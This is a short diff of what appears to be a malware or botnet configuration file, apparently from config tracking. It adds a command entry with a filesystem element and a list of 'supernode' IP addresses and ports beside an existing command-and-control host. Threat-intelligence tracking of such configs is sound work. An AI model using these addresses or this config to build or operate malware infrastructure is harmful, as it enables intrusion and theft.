@@ -22,7 +22,11 @@
 
 <settings>
   <modules/>
-  <commands/>
+  <commands>
+    <cmd id="4839" type="9">
+      <fs/>
+    </cmd>
+  </commands>
   <config>
     <httpshots>
       <url onget="1" onpost="1" type="deny">\.(gif|png|jpg|css|swf|ico|js)($|\?)</url>
@@ -487,4 +491,18 @@
       <ip>139.59.185.21</ip>
     </host>
   </c2>
+  <supernodes>
+    <node>
+      <ip>76.184.3.225</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>66.186.52.2</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>43.231.250.172</ip>
+      <port>3389</port>
+    </node>
+  </supernodes>
 </settings>
